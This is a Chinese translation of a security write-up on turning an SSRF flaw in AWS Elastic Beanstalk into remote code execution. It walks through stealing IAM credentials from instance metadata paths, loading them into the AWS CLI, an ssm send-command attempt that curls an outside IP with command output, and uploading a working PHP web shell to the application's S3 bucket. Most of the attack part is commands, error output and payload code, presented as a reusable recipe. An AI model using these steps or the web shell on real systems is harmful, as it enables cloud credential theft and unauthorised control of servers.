
- AWS Elastic Beanstalk是AWS提供的平台即服务（PaaS）产品，用于部署和扩展针对各种环境（如Java，.NET，PHP，Node.js，Python，Ruby和Go）开发的Web应用程序。
- 它自动处理部署，容量配置，负载平衡，自动扩展和应用程序运行状况监视。

## 窃取所需数据：

1）跳转到`/latest/meta-data/iam/security-credentials/aws-elasticbeanstalk-ec2-role/`页面

可以得到`AccessKeyId`，`SecretAccessKey`，`Token`

![](https://bbs.kanxue.com/upload/attach/201905/214974_JK9UZTTBJS9DGNP.jpg)

2）跳转到`/latest/dynamic/instance-identity/document/`页面

可以得到`instanceId`，`accountId`，`region`

![](https://bbs.kanxue.com/upload/attach/201905/214974_EKGWX3GVN6XCMQE.jpg)

## 配置AWS命令行界面：

- 打开终端，敲这些命令：

```
~# apt install awscli
~# export AWS_ACCESS_KEY_ID=AccessKeyId
~# export AWS_SECRET_ACCESS_KEY=SecretAccessKey
~# export AWS_DEFAULT_REGION=region
~# export AWS_SESSION_TOKEN=Token
```

![](https://bbs.kanxue.com/upload/attach/201905/214974_4T9H2BZNDT6XTVD.jpg)

- 得到`UserID`

```
~# aws sts get-caller-identity
```

![](https://bbs.kanxue.com/upload/attach/201905/214974_745SMGV9UJE2452.jpg)

SSRF利用得很好，现在让我们探索更多的可能性，将其升级为更大的“RCE”。

## 将SSRF升级为RCE：

我去尝试了一些潜在的exploit场景。

- 通过`ssm send-command`提权 **失败**

经过几项研究尝试使用AWS 系统管理员 `ssm`命令。

该角色无权执行此命令。我希望用`aws ssm send-command`提权。

```
~# aws ssm send-command –instance-ids “instanceId” –document-name “AWS-RunShellScript” –comment “whoami” –parameters commands=’curl 128.199.xx.xx:8080/`whoami`’ –output text –region=region
```

回显内容：

```
An error occurred (AccessDeniedException) when calling the SendCommand operation: User: arn:aws:sts::765xxxxxxxxx:assumed-role/aws-elasticbeanstalk-ec2-role/i-007xxxxxxxxxxxxxx is not authorized to perform: ssm:SendCommand on resource: arn:aws:ec2:us-east-1:765xxxxxxxxx:instance/i-00xxxxxxxxxxxxxx
```

![](https://bbs.kanxue.com/upload/attach/201905/214974_KVXRMTSREZUGMVP.jpg)

- 通过`SSH`提权 **失败**

SSH端口已关闭。本来我希望能以这样喜闻乐见的一幕提权场景提权：

“创建RSA身份验证密钥对（公钥和私钥），能够从帐户登录远程站点，而无需输入密码。”

![](https://bbs.kanxue.com/upload/attach/201905/214974_D57K76N36MN4KQ4.jpg)

- Uploading Backdoor 提权 **成功**

试图阅读 S3 Bucket 内容：

尝试使用AWS CLI运行多个命令以从AWS实例检索信息。但是，由于安全策略的原因，对大多数命令的访问被拒绝。

```
~# aws s3 ls
```

回显内容：

```
An error occurred (AccessDenied) when calling the ListBuckets operation: Access Denied

//调用ListBuckets操作时发生（拒绝访问）错误：拒绝访问
```

经过几项研究后发现托管策略`AWSElasticBeanstalkWebTier`只允许访问名称以`elasticbeanstalk`开头的S3 buckets。

为了访问S3 buckets，我们将使用以前采用的数据，格式如下：

```
elasticbeanstalk-区域-账户-id
```

现在，bucket名称为`elasticbeanstalk-us-east-1-76xxxxxxxx00`。

让我们以递归方式列出`elasticbeanstalk-us-east-1-76xxxxxxxx00`的bucket资源，以使用AWS CLI执行此长时间运行的任务：

```
~# aws s3 ls s3://elasticbeanstalk-us-east-1-76xxxxxxxx00/ –recursive
```

现在，让我们尝试上传一个后门！

```
~# cat cmd.php
```

```
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
```

![](https://bbs.kanxue.com/upload/attach/201905/214974_RE9XCRM8TPE6422.jpg)

```
~# aws s3 cp cmd.php s3://elasticbeanstalk-us-east-1-76xxxxxxxx00/
```

![](https://bbs.kanxue.com/upload/attach/201905/214974_9YPS7TBWJG5YWFC.jpg)

```
upload: ./cmd.php to s3://docs.redact.com/cmd.php
```

![](https://bbs.kanxue.com/upload/attach/201905/214974_A2BVGWN4TBWRARP.jpg)

在这里我们成功获得了RCE！

![](https://bbs.kanxue.com/upload/attach/201905/214974_M43JSFVCGKQ7XT2.jpg)

## 简而言之：

您可以通过多种方式将服务器端请求伪造升级到远程执行代码，但这取决于您的目标环境。

**快乐黑客！**

![](https://bbs.kanxue.com/upload/attach/201905/214974_Q297X3MVBNFBCBQ.jpg)

翻译：看雪翻译小组 lipss

校对：看雪翻译小组 Daemond

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)
